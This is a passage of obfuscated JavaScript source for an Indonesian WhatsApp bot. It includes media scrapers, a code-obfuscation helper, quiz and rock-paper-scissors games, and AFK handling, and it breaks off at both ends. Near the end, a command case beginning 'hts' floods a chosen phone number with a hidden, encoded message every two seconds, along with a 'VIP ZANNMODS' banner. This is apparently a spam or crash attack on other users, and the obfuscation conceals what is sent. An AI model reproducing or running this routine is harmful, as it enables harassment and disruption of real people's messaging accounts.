        _0x303d1f(_0x214b73)
      }
    }
    async function _0x149782(_0x1dee0c, _0x39a972, _0x13ba4d = {}) {
      const _0x19803d = _0x28e58e
      let _0x4987b2 = await generateWAMessage(_0x1dee0c, _0x39a972, _0x13ba4d),
        _0x2372d1 = getContentType(_0x4987b2[_0x19803d(378)])
      if (_0x19803d(468) in _0x13ba4d) {
        _0x4987b2[_0x19803d(378)][_0x2372d1][_0x19803d(468)] =
          _0x13ba4d?.[_0x19803d(468)]
      }
      if (_0x19803d(468) in _0x39a972) {
        _0x4987b2[_0x19803d(378)][_0x2372d1].contextInfo =
          _0x39a972?.[_0x19803d(468)]
      }
      return await _0x40c8bf[_0x19803d(518)](
        _0x1dee0c,
        _0x4987b2[_0x19803d(378)],
        { messageId: _0x4987b2.key.id }
      )
    }
    async function _0x670804(_0x821e9e) {
      return new Promise((_0x41d6c5, _0x2344f0) => {
        try {
          const _0x51168f = jsobfus.obfuscate(_0x821e9e, {
              compact: false,
              controlFlowFlattening: true,
              controlFlowFlatteningThreshold: 1,
              numbersToExpressions: true,
              simplify: true,
              stringArrayShuffle: true,
              splitStrings: true,
              stringArrayThreshold: 1,
            }),
            _0x218c91 = {
              status: 200,
              author: 'yudamods',
              result: _0x51168f.getObfuscatedCode(),
            }
          _0x41d6c5(_0x218c91)
        } catch (_0x385d3a) {
          _0x2344f0(_0x385d3a)
        }
      })
    }
    async function _0x5b37c4(_0x45c871) {
      const _0x5ae928 = _0x28e58e
      try {
        const _0x297351 = await axios[_0x5ae928(414)](
            'https://tools.revesery.com/ai/ai.php?query=' + _0x45c871,
            {
              headers: {
                Accept: _0x5ae928(680),
                'Content-Type': _0x5ae928(716),
                'User-Agent':
                  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.999 Safari/537.36',
              },
            }
          ),
          _0x45e093 = _0x297351[_0x5ae928(344)],
          _0x538e2c = _0x45e093[_0x5ae928(659)]
      } catch (_0x390c63) {
        console[_0x5ae928(679)](_0x390c63)
      }
    }
    async function _0x4ed8b2(_0x1f4955) {
      const _0x40470a = _0x28e58e
      let _0x1723c7 = await axios[_0x40470a(414)](
        _0x40470a(553) + _0x1f4955 + _0x40470a(395)
      )
      const _0x2d97a4 = _0x1723c7[_0x40470a(344)],
        _0x430842 = cheerio[_0x40470a(590)](_0x2d97a4)
      let _0x17bea5 = [],
        _0x481baa = [],
        _0x2920a5 = _0x40470a(487)
      _0x430842('div.col-md-12 > img').each((_0x332da3, _0x3dda09) => {
        const _0x31b30f = _0x40470a
        _0x481baa[_0x31b30f(575)](_0x430842(_0x3dda09).attr('src'))
      })
      _0x17bea5[_0x40470a(575)]({
        creator: _0x2920a5,
        imgSrc: _0x481baa,
      })
      let _0x1dfaac = _0x481baa[_0x40470a(388)]((_0x287712, _0x3b1987) => {
        return {
          img: _0x287712,
          creator: _0x2920a5[_0x3b1987],
        }
      })
      for (let _0x3d2f0e of _0x17bea5) {
        return _0x3d2f0e
      }
    }
    async function _0x46445b(_0x539d7e) {
      const _0x1ec0aa = _0x28e58e
      let _0x33b78b = _0x1ec0aa(417)
      return new Promise(async (_0x23bc64, _0x5371ab) => {
        const _0x24d89d = _0x1ec0aa
        try {
          const _0x18ac48 = await axios({
            method: 'POST',
            url: _0x24d89d(527),
            body: JSON[_0x24d89d(603)](_0x539d7e),
            headers: {
              authorization: 'Token ' + _0x33b78b,
              'Content-Type': 'application/json',
              'User-Agent': _0x24d89d(405),
              client: 'Token ' + _0x33b78b,
            },
          })
          if (_0x18ac48[_0x24d89d(738)]() === 200) {
            const _0x2d320c = await JSON[_0x24d89d(671)](_0x18ac48),
              _0x35bcb5 = _0x2d320c.replies,
              _0x5169ce = []
            for (
              let _0x39d79b = 0;
              _0x39d79b < _0x35bcb5[_0x24d89d(702)];
              _0x39d79b++
            ) {
              _0x40c8bf[_0x24d89d(351)](
                _0x39d79b,
                { text: '' + _0x3807e2 },
                { quoted: _0x30af8e }
              )
            }
            _0x23bc64(i)
          }
        } catch (_0xfc67f7) {
          _0x5371ab(_0xfc67f7)
        }
      })
    }
    async function _0x43bd76(_0x1dcf9d) {
      return new Promise(async (_0x55e20d, _0x14d8b0) => {
        try {
          const _0x137d1c = await axios({
              method: 'POST',
              url: 'https://tikwm.com/api/feed/search',
              headers: {
                'Content-Type':
                  'application/x-www-form-urlencoded; charset=UTF-8',
                Cookie: 'current_language=en',
                'User-Agent':
                  'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
              },
              data: {
                keywords: _0x1dcf9d,
                count: 50,
                cursor: 0,
                HD: 1,
              },
            }),
            _0x1452e1 = _0x137d1c.data.data.videos
          if (_0x1452e1.length === 0) {
            _0x14d8b0('*Tidak Ada Video Yang Ditemukan* \uD83D\uDE25')
          } else {
            const _0x4a58a7 = Math.floor(Math.random() * _0x1452e1.length),
              _0x54cd11 = _0x1452e1[_0x4a58a7],
              _0x24cbc9 = {
                title: _0x54cd11.title,
                cover: _0x54cd11.cover,
                origin_cover: _0x54cd11.origin_cover,
                no_watermark: _0x54cd11.play,
                watermark: _0x54cd11.wmplay,
                music: _0x54cd11.music,
              }
            _0x55e20d(_0x24cbc9)
          }
        } catch (_0x586356) {
          _0x14d8b0(_0x586356)
        }
      })
    }
    async function _0x125059(_0x477e0b) {
      return new Promise(async (_0x174de1, _0x864524) => {
        try {
          const _0x480ea9 = new URLSearchParams()
          _0x480ea9.set('url', _0x477e0b)
          _0x480ea9.set('hd', '1')
          const _0x1293af = await axios({
              method: 'POST',
              url: 'https://tikwm.com/api/',
              headers: {
                'Content-Type':
                  'application/x-www-form-urlencoded; charset=UTF-8',
                Cookie: 'current_language=en',
                'User-Agent':
                  'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
              },
              data: _0x480ea9,
            }),
            _0x408aeb = _0x1293af.data.data,
            _0x86bd6 = {
              title: _0x408aeb.title,
              cover: _0x408aeb.cover,
              origin_cover: _0x408aeb.origin_cover,
              no_watermark: _0x408aeb.play,
              watermark: _0x408aeb.wmplay,
              music: _0x408aeb.music,
            }
          _0x174de1(_0x86bd6)
        } catch (_0x6a80b6) {
          _0x864524(_0x6a80b6)
        }
      })
    }
    async function _0x2ae0f4(_0x37e529) {
      return _0x37e529
    }
    async function _0x106b3e(_0x3ca9cf) {
      const _0x1ba497 = _0x28e58e
      let _0x46e639 = await axios(_0x1ba497(563), {
        method: 'POST',
        data: new URLSearchParams(Object[_0x1ba497(507)]({ query: _0x3ca9cf })),
      })
      return (
        (result = {}),
        (result.creator = _0x1ba497(533)),
        (result.title = _0x391843(_0x46e639[_0x1ba497(344)].desc)),
        (result[_0x1ba497(508)] = _0x391843(
          _0x46e639[_0x1ba497(344)][_0x1ba497(508)]
        )),
        (result.nowm = await _0x2ae0f4(
          (_0x46e639[_0x1ba497(344)].links[0].a || '').replace('https', 'http')
        )),
        (result[_0x1ba497(630)] = await _0x2ae0f4(
          (_0x46e639[_0x1ba497(344)].links[1].a || '')[_0x1ba497(331)](
            _0x1ba497(456),
            _0x1ba497(363)
          )
        )),
        (result.audio = await _0x2ae0f4(
          (_0x46e639[_0x1ba497(344)][_0x1ba497(696)][2].a || '')[
            _0x1ba497(331)
          ](_0x1ba497(456), _0x1ba497(363))
        )),
        (result[_0x1ba497(634)] = await _0x2ae0f4(
          _0x46e639[_0x1ba497(344)][_0x1ba497(619)]
        )),
        result
      )
    }
    async function _0x23b643(_0x37283c, _0x40d731) {
      const _0x16ef74 = _0x28e58e,
        _0x2f9325 = []
      for (const _0x467d1c of _0x37283c) {
        if (await _0x505c86(_0x467d1c)) {
          _0x2f9325[_0x16ef74(575)](_0x467d1c)
          if (_0x2f9325[_0x16ef74(702)] >= _0x40d731) {
            break
          }
        }
      }
      return _0x2f9325
    }
    async function _0x505c86(_0x3a4c90) {
      const _0x376fbe = _0x28e58e
      try {
        const _0x989515 = await fetch(_0x3a4c90, { method: _0x376fbe(731) }),
          _0x48498f = _0x989515.headers.get(_0x376fbe(312))
        return _0x48498f && _0x48498f[_0x376fbe(451)]('image')
      } catch (_0x39c079) {
        return false
      }
    }
    for (let _0x3530b0 of apknye) {
      if (_0x614e5c === _0x3530b0) {
        let _0x4c78d6 = fs[_0x28e58e(555)](
          './database/apk/' + _0x3530b0 + _0x28e58e(305)
        )
        _0x3378a5(_0x4c78d6)
      }
    }
    for (let _0x26c6a9 of zipnye) {
      if (_0x614e5c === _0x26c6a9) {
        let _0x322a93 = fs[_0x28e58e(555)](
          _0x28e58e(472) + _0x26c6a9 + _0x28e58e(687)
        )
        _0x211aa0(_0x322a93)
      }
    }
    for (let _0x2b2d0c of docunye) {
      if (_0x614e5c === _0x2b2d0c) {
        let _0x282c7f = fs.readFileSync(
          './database/Docu/' + _0x2b2d0c + _0x28e58e(483)
        )
        _0x5f1777(_0x282c7f)
      }
    }
    for (let _0x5e82ca of vnnye) {
      if (_0x614e5c[_0x28e58e(495)](_0x5e82ca)) {
        let _0x32a2b5 = fs[_0x28e58e(555)](
          _0x28e58e(725) + _0x5e82ca + _0x28e58e(610)
        )
        _0x261bc1(_0x32a2b5)
      }
    }
    try {
      ppuser = await _0x40c8bf[_0x28e58e(618)](
        _0x30af8e[_0x28e58e(475)],
        _0x28e58e(449)
      )
    } catch (_0x587889) {
      ppuser = _0x28e58e(728)
    }
    ppnyauser = await getBuffer(ppuser)
    if (
      kuismath[_0x28e58e(477)](_0x30af8e[_0x28e58e(475)].split('@')[0]) &&
      _0x3acce3
    ) {
      kuis = true
      jawaban = kuismath[_0x30af8e[_0x28e58e(475)][_0x28e58e(436)]('@')[0]]
      if (_0x614e5c.toLowerCase() == jawaban) {
        await _0x303d1f(_0x28e58e(309) + _0x2d9e85 + _0x28e58e(629))
        delete kuismath[_0x30af8e[_0x28e58e(475)].split('@')[0]]
      } else {
        _0x303d1f('*Jawaban Salah!*')
      }
    }
    if (
      tebakgambar.hasOwnProperty(_0x30af8e[_0x28e58e(475)].split('@')[0]) &&
      _0x3acce3
    ) {
      kuis = true
      jawaban = tebakgambar[_0x30af8e[_0x28e58e(475)][_0x28e58e(436)]('@')[0]]
      if (_0x614e5c[_0x28e58e(504)]() == jawaban) {
        _0x40c8bf[_0x28e58e(351)](
          _0x30af8e[_0x28e58e(568)],
          {
            image: ppnyauser,
            caption: _0x28e58e(377),
          },
          { quoted: _0x30af8e }
        )
        delete tebakgambar[_0x30af8e[_0x28e58e(475)][_0x28e58e(436)]('@')[0]]
      } else {
        _0x303d1f(_0x28e58e(605))
      }
    }
    if (
      tebakkata[_0x28e58e(477)](_0x30af8e[_0x28e58e(475)].split('@')[0]) &&
      _0x3acce3
    ) {
      kuis = true
      jawaban = tebakkata[_0x30af8e.sender[_0x28e58e(436)]('@')[0]]
      if (_0x614e5c[_0x28e58e(504)]() == jawaban) {
        _0x40c8bf[_0x28e58e(351)](
          _0x30af8e[_0x28e58e(568)],
          {
            image: ppnyauser,
            caption:
              '\uD83C\uDFAE Tebak Kata \uD83C\uDFAE\n\nJawaban Benar \uD83C\uDF89\n\nIngin bermain lagi? Silahkan Ketik Tebak Kata',
          },
          { quoted: _0x30af8e }
        )
        delete tebakkata[_0x30af8e[_0x28e58e(475)][_0x28e58e(436)]('@')[0]]
      } else {
        _0x303d1f(_0x28e58e(605))
      }
    }
    if (
      caklontong[_0x28e58e(477)](
        _0x30af8e[_0x28e58e(475)][_0x28e58e(436)]('@')[0]
      ) &&
      _0x3acce3
    ) {
      kuis = true
      jawaban = caklontong[_0x30af8e[_0x28e58e(475)].split('@')[0]]
      deskripsi = caklontong_desk[_0x30af8e.sender[_0x28e58e(436)]('@')[0]]
      if (_0x614e5c[_0x28e58e(504)]() == jawaban) {
        _0x40c8bf.sendMessage(
          _0x30af8e[_0x28e58e(568)],
          {
            image: ppnyauser,
            caption: _0x28e58e(343),
          },
          { quoted: _0x30af8e }
        )
        delete caklontong[_0x30af8e[_0x28e58e(475)][_0x28e58e(436)]('@')[0]]
        delete caklontong_desk[
          _0x30af8e[_0x28e58e(475)][_0x28e58e(436)]('@')[0]
        ]
      } else {
        _0x303d1f(_0x28e58e(605))
      }
    }
    if (
      tebakkalimat[_0x28e58e(477)](
        _0x30af8e[_0x28e58e(475)][_0x28e58e(436)]('@')[0]
      ) &&
      _0x3acce3
    ) {
      kuis = true
      jawaban = tebakkalimat[_0x30af8e[_0x28e58e(475)].split('@')[0]]
      if (_0x614e5c[_0x28e58e(504)]() == jawaban) {
        _0x40c8bf[_0x28e58e(351)](
          _0x30af8e[_0x28e58e(568)],
          {
            image: ppnyauser,
            caption: _0x28e58e(324),
          },
          { quoted: _0x30af8e }
        )
        delete tebakkalimat[_0x30af8e[_0x28e58e(475)][_0x28e58e(436)]('@')[0]]
      } else {
        _0x303d1f(_0x28e58e(605))
      }
    }
    if (
      tebaklirik[_0x28e58e(477)](_0x30af8e[_0x28e58e(475)].split('@')[0]) &&
      _0x3acce3
    ) {
      kuis = true
      jawaban = tebaklirik[_0x30af8e[_0x28e58e(475)][_0x28e58e(436)]('@')[0]]
      if (_0x614e5c[_0x28e58e(504)]() == jawaban) {
        _0x40c8bf[_0x28e58e(351)](
          _0x30af8e[_0x28e58e(568)],
          {
            image: ppnyauser,
            caption:
              '\uD83C\uDFAE Tebak Lirik \uD83C\uDFAE\n\nJawaban Benar \uD83C\uDF89\n\nIngin bermain lagi? Silahkan Ketik Tebak Lirik',
          },
          { quoted: _0x30af8e }
        )
        delete tebaklirik[_0x30af8e[_0x28e58e(475)].split('@')[0]]
      } else {
        _0x303d1f(_0x28e58e(605))
      }
    }
    if (
      tebaktebakan[_0x28e58e(477)](_0x30af8e.sender[_0x28e58e(436)]('@')[0]) &&
      _0x3acce3
    ) {
      kuis = true
      jawaban = tebaktebakan[_0x30af8e.sender[_0x28e58e(436)]('@')[0]]
      if (_0x614e5c[_0x28e58e(504)]() == jawaban) {
        _0x40c8bf[_0x28e58e(351)](
          _0x30af8e[_0x28e58e(568)],
          {
            image: ppnyauser,
            caption:
              '\uD83C\uDFAE Tebak Tebakan \uD83C\uDFAE\n\nJawaban Benar \uD83C\uDF89\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan',
          },
          { quoted: _0x30af8e }
        )
        delete tebaktebakan[_0x30af8e[_0x28e58e(475)][_0x28e58e(436)]('@')[0]]
      } else {
        _0x303d1f(_0x28e58e(605))
      }
    }
    this[_0x28e58e(544)] = this[_0x28e58e(544)] ? this[_0x28e58e(544)] : {}
    if (_0x5676cd) {
      if (
        !/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i[_0x28e58e(424)](
          _0x30af8e[_0x28e58e(490)]
        )
      ) {
        return
      }
      _0x4ea53f = !/^[1-9]$/[_0x28e58e(424)](_0x30af8e[_0x28e58e(490)])
      if (_0x30af8e.sender !== _0x5676cd[_0x28e58e(544)].currentTurn) {
        if (!_0x4ea53f) {
          return true
        }
      }
      if (
        !_0x4ea53f &&
        1 >
          (_0x28166e = _0x5676cd[_0x28e58e(544)].turn(
            _0x30af8e[_0x28e58e(475)] ===
              _0x5676cd[_0x28e58e(544)][_0x28e58e(364)],
            parseInt(_0x30af8e[_0x28e58e(490)]) - 1
          ))
      ) {
        return (
          _0x303d1f(
            {
              '-3': _0x28e58e(621),
              '-2': _0x28e58e(408),
              '-1': 'Posisi Invalid',
              0: 'Posisi Invalid',
            }[_0x28166e]
          ),
          true
        )
      }
      if (
        _0x30af8e[_0x28e58e(475)] === _0x5676cd[_0x28e58e(544)][_0x28e58e(521)]
      ) {
        _0x29a1c5 = true
      } else {
        if (_0x5676cd.game.board === 511) {
          _0x477726 = true
        }
      }
      _0x4ea53f &&
        ((_0x5676cd[_0x28e58e(544)][_0x28e58e(552)] =
          _0x30af8e[_0x28e58e(475)] ===
          _0x5676cd[_0x28e58e(544)][_0x28e58e(683)]),
        (_0x29a1c5 = true))
      if (
        (_0x5676cd[_0x28e58e(544)][_0x28e58e(552)] ^ _0x4ea53f
          ? _0x5676cd.x
          : _0x5676cd.o) !== _0x209768
      ) {
        _0x5676cd[_0x5676cd.game[_0x28e58e(552)] ^ _0x4ea53f ? 'x' : 'o'] =
          _0x209768
      }
      if (_0x5676cd.x !== _0x5676cd.o) {
        await _0x40c8bf.sendText(_0x5676cd.x, _0x31fb18, _0x30af8e, {
          mentions: _0x1b84e1(_0x31fb18),
        })
      }
      await _0x40c8bf[_0x28e58e(529)](_0x5676cd.o, _0x31fb18, _0x30af8e, {
        mentions: _0x1b84e1(_0x31fb18),
      })
      ;(_0x477726 || _0x29a1c5) && delete this.game[_0x5676cd.id]
    }
    this[_0x28e58e(697)] = this[_0x28e58e(697)] ? this[_0x28e58e(697)] : {}
    if (_0x23cfd1) {
      if (
        _0x30af8e.sender == _0x23cfd1.p2 &&
        /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i[
          _0x28e58e(424)
        ](_0x30af8e[_0x28e58e(490)]) &&
        _0x30af8e[_0x28e58e(437)] &&
        _0x23cfd1[_0x28e58e(738)] == 'wait'
      ) {
        if (
          /^(tolak|gamau|nanti|n|ga(k.)?bisa)/i[_0x28e58e(424)](
            _0x30af8e[_0x28e58e(490)]
          )
        ) {
          return (
            _0x40c8bf.sendTextWithMentions(
              _0x209768,
              '@' + _0x23cfd1.p2.split`@`[0] + ' menolak suit, suit dibatalkan',
              _0x30af8e
            ),
            delete this[_0x28e58e(697)][_0x23cfd1.id],
            true
          )
        }
        _0x23cfd1[_0x28e58e(738)] = _0x28e58e(383)
        _0x23cfd1[_0x28e58e(646)] = _0x209768
        clearTimeout(_0x23cfd1[_0x28e58e(494)])
        _0x40c8bf[_0x28e58e(529)](
          _0x209768,
          _0x28e58e(387) +
            _0x23cfd1.p[_0x28e58e(436)]`@`[0] +
            ' dan \n@' +
            _0x23cfd1.p2.split`@`[0] +
            '\n\nSilahkan pilih suit di chat masing"\nklik https://wa.me/' +
            _0x8ca5c2[_0x28e58e(436)]`@`[0],
          _0x30af8e,
          {
            mentions: [_0x23cfd1.p, _0x23cfd1.p2],
          }
        )
        if (!_0x23cfd1[_0x28e58e(517)]) {
          _0x40c8bf.sendText(
            _0x23cfd1.p,
            'Silahkan pilih \n\nBatu\uD83D\uDDFF\nKertas\uD83D\uDCC4\nGunting\u2702️',
            _0x30af8e
          )
        }
        if (!_0x23cfd1.pilih2) {
          _0x40c8bf[_0x28e58e(529)](_0x23cfd1.p2, _0x28e58e(441), _0x30af8e)
        }
        _0x23cfd1[_0x28e58e(626)] = setTimeout(() => {
          const _0x1d2479 = _0x28e58e
          if (!_0x23cfd1[_0x1d2479(517)] && !_0x23cfd1[_0x1d2479(703)]) {
            _0x40c8bf[_0x1d2479(529)](_0x209768, _0x1d2479(654))
          } else {
            ;(!_0x23cfd1[_0x1d2479(517)] || !_0x23cfd1[_0x1d2479(703)]) &&
              ((_0x4a9c94 = !_0x23cfd1.pilih ? _0x23cfd1.p2 : _0x23cfd1.p),
              _0x40c8bf[_0x1d2479(669)](
                _0x209768,
                '@' +
                  (_0x23cfd1[_0x1d2479(517)] ? _0x23cfd1.p2 : _0x23cfd1.p)[
                    _0x1d2479(436)
                  ]`@`[0] +
                  _0x1d2479(502),
                _0x30af8e
              ))
          }
          return delete this.suit[_0x23cfd1.id], true
        }, _0x23cfd1[_0x28e58e(506)])
      }
      if (
        _0x15d985 &&
        _0x26012f.test(_0x30af8e.text) &&
        !_0x23cfd1[_0x28e58e(517)] &&
        !_0x30af8e[_0x28e58e(437)]
      ) {
        _0x23cfd1[_0x28e58e(517)] = _0x26012f[_0x28e58e(551)](
          _0x30af8e[_0x28e58e(490)][_0x28e58e(504)]()
        )[0]
        _0x23cfd1[_0x28e58e(490)] = _0x30af8e.text
        _0x303d1f(
          _0x28e58e(368) +
            _0x30af8e[_0x28e58e(490)] +
            ' ' +
            (!_0x23cfd1[_0x28e58e(703)] ? '\n\nMenunggu lawan memilih' : '')
        )
        if (!_0x23cfd1[_0x28e58e(703)]) {
          _0x40c8bf.sendText(_0x23cfd1.p2, _0x28e58e(628), 0)
        }
      }
      if (
        _0x561887 &&
        _0x26012f.test(_0x30af8e[_0x28e58e(490)]) &&
        !_0x23cfd1[_0x28e58e(703)] &&
        !_0x30af8e[_0x28e58e(437)]
      ) {
        _0x23cfd1.pilih2 = _0x26012f[_0x28e58e(551)](
          _0x30af8e[_0x28e58e(490)][_0x28e58e(504)]()
        )[0]
        _0x23cfd1[_0x28e58e(491)] = _0x30af8e.text
        _0x303d1f(
          _0x28e58e(368) +
            _0x30af8e[_0x28e58e(490)] +
            ' ' +
            (!_0x23cfd1.pilih ? _0x28e58e(733) : '')
        )
        if (!_0x23cfd1.pilih) {
          _0x40c8bf[_0x28e58e(529)](
            _0x23cfd1.p,
            '_Lawan sudah memilih_\nSekarang giliran kamu',
            0
          )
        }
      }
      if (_0x23cfd1.pilih && _0x23cfd1[_0x28e58e(703)]) {
        clearTimeout(_0x23cfd1.waktu_milih)
        if (
          _0x180b49[_0x28e58e(424)](_0x1db713) &&
          _0x48a719[_0x28e58e(424)](_0x5dccb6)
        ) {
          _0x4a9c94 = _0x23cfd1.p
        } else {
          if (
            _0x180b49[_0x28e58e(424)](_0x1db713) &&
            _0x2d1968[_0x28e58e(424)](_0x5dccb6)
          ) {
            _0x4a9c94 = _0x23cfd1.p2
          } else {
            if (
              _0x48a719[_0x28e58e(424)](_0x1db713) &&
              _0x2d1968[_0x28e58e(424)](_0x5dccb6)
            ) {
              _0x4a9c94 = _0x23cfd1.p
            } else {
              if (
                _0x48a719[_0x28e58e(424)](_0x1db713) &&
                _0x180b49[_0x28e58e(424)](_0x5dccb6)
              ) {
                _0x4a9c94 = _0x23cfd1.p2
              } else {
                if (
                  _0x2d1968.test(_0x1db713) &&
                  _0x180b49[_0x28e58e(424)](_0x5dccb6)
                ) {
                  _0x4a9c94 = _0x23cfd1.p
                } else {
                  if (
                    _0x2d1968[_0x28e58e(424)](_0x1db713) &&
                    _0x48a719.test(_0x5dccb6)
                  ) {
                    _0x4a9c94 = _0x23cfd1.p2
                  } else {
                    if (_0x1db713 == _0x5dccb6) {
                      _0x12dac0 = true
                    }
                  }
                }
              }
            }
          }
        }
        _0x40c8bf[_0x28e58e(529)](
          _0x23cfd1[_0x28e58e(646)],
          (_0x28e58e(648) +
            (_0x12dac0 ? _0x28e58e(463) : '') +
            _0x28e58e(394) +
            _0x23cfd1.p.split`@`[0] +
            ' (' +
            _0x23cfd1[_0x28e58e(490)] +
            ') ' +
            (_0x12dac0
              ? ''
              : _0x23cfd1.p == _0x4a9c94
              ? _0x28e58e(373)
              : _0x28e58e(522)) +
            '\n@' +
            _0x23cfd1.p2[_0x28e58e(436)]`@`[0] +
            ' (' +
            _0x23cfd1[_0x28e58e(491)] +
            ') ' +
            (_0x12dac0
              ? ''
              : _0x23cfd1.p2 == _0x4a9c94
              ? _0x28e58e(373)
              : _0x28e58e(522)) +
            '\n')[_0x28e58e(317)](),
          _0x30af8e,
          {
            mentions: [_0x23cfd1.p, _0x23cfd1.p2],
          }
        )
        delete this[_0x28e58e(697)][_0x23cfd1.id]
      }
    }
    for (let _0x452688 of _0x239b1b) {
      let _0xdc1507 = global.db[_0x28e58e(344)][_0x28e58e(557)][_0x452688]
      if (!_0xdc1507) {
        continue
      }
      let _0x2ef4fd = _0xdc1507[_0x28e58e(684)]
      if (!_0x2ef4fd || _0x2ef4fd < 0) {
        continue
      }
      let _0x53a0a4 = _0xdc1507[_0x28e58e(611)] || ''
      _0x303d1f(
        (_0x28e58e(418) +
          (_0x53a0a4 ? _0x28e58e(576) + _0x53a0a4 : _0x28e58e(714)) +
          _0x28e58e(390) +
          clockString(new Date() - _0x2ef4fd) +
          '\n')[_0x28e58e(317)]()
      )
    }
    if (global.db.data.users[_0x30af8e[_0x28e58e(475)]][_0x28e58e(684)] > -1) {
      _0x303d1f(
        (_0x28e58e(755) +
          _0x26a6ce +
          _0x28e58e(470) +
          (_0x57256c.afkReason
            ? ' *Dengan Alasan* : ' + _0x57256c[_0x28e58e(611)]
            : '') +
          _0x28e58e(464) +
          clockString(new Date() - _0x57256c[_0x28e58e(684)]) +
          '\n')[_0x28e58e(317)]()
      )
      _0x57256c[_0x28e58e(684)] = -1
      _0x57256c[_0x28e58e(611)] = ''
    }
    switch (_0x17ba71) {
      case _0x28e58e(682):
      case _0x28e58e(371):
      case 'mainmenu':
        {
          if (_0x737bcc) {
            return _0x303d1f('*Kamu Di Ban Owner*')
          }
          _0x182b8f()
          await sleep(1000)
          _0x40c8bf[_0x28e58e(351)](_0x30af8e[_0x28e58e(568)], {
            audio: fs.readFileSync('./src/audio/lopyou.mp3'),
          })
          _0x40c8bf[_0x28e58e(351)](_0x30af8e[_0x28e58e(568)], {
            video: fs[_0x28e58e(555)](_0x28e58e(469)),
            caption: _0x3b62e9,
            gifPlayback: true,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: _0xfd55cd + ' ' + _0x26a6ce,
                body: _0x28e58e(420),
                thumbnailUrl:
                  'https://telegra.ph/file/28e4846bcc1045d6494ba.png',
                sourceUrl: 'https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz',
                mediaType: 1,
                renderLargerThumbnail: false,
              },
            },
          })
        }
        break
      case 'hts':
      case _0x28e58e(593):
      case _0x28e58e(478):
      case _0x28e58e(482):
      case _0x28e58e(751):
        {
          if (!_0x24eb5a) {
            return _0x303d1f(_0x28e58e(699))
          }
          if (!_0x41aad1[0]) {
            return _0x303d1f(
              _0x28e58e(503) +
                (_0x2d9e85 + _0x17ba71) +
                _0x28e58e(548) +
                (_0x2d9e85 + _0x17ba71) +
                _0x28e58e(409)
            )
          }
          Pe = _0x30af8e.mentionedJid[0]
            ? _0x30af8e[_0x28e58e(520)][0]
            : _0x30af8e[_0x28e58e(384)]
            ? _0x30af8e.quoted[_0x28e58e(475)]
            : _0x3807e2[_0x28e58e(331)](/[^0-9]/g, '') + '@s.whatsapp.net'
          _0x40c8bf[_0x28e58e(351)](
            _0x209768,
            { text: _0x28e58e(481) },
            { quoted: _0x37c453 }
          )
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf.sendMessage(
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            {
              text: '\uD83D\uDE80\uD835\uDC15\uD835\uDC08\uD835\uDC0F \uD835\uDC19\uD835\uDC00\uD835\uDC0D\uD835\uDC0D\uD835\uDC0C\uD835\uDC0E\uD835\uDC03\uD835\uDC12\uD83D\uDE80',
            },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf.sendMessage(
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            {
              text: '\uD83D\uDE80\uD835\uDC15\uD835\uDC08\uD835\uDC0F \uD835\uDC19\uD835\uDC00\uD835\uDC0D\uD835\uDC0D\uD835\uDC0C\uD835\uDC0E\uD835\uDC03\uD835\uDC12\uD83D\uDE80',
            },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf.sendMessage(
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf.sendMessage(
            Pe,
            {
              text: '\uD83D\uDE80\uD835\uDC15\uD835\uDC08\uD835\uDC0F \uD835\uDC19\uD835\uDC00\uD835\uDC0D\uD835\uDC0D\uD835\uDC0C\uD835\uDC0E\uD835\uDC03\uD835\uDC12\uD83D\uDE80',
            },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            {
              text: '\uD83D\uDE80\uD835\uDC15\uD835\uDC08\uD835\uDC0F \uD835\uDC19\uD835\uDC00\uD835\uDC0D\uD835\uDC0D\uD835\uDC0C\uD835\uDC0E\uD835\uDC03\uD835\uDC12\uD83D\uDE80',
            },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            {
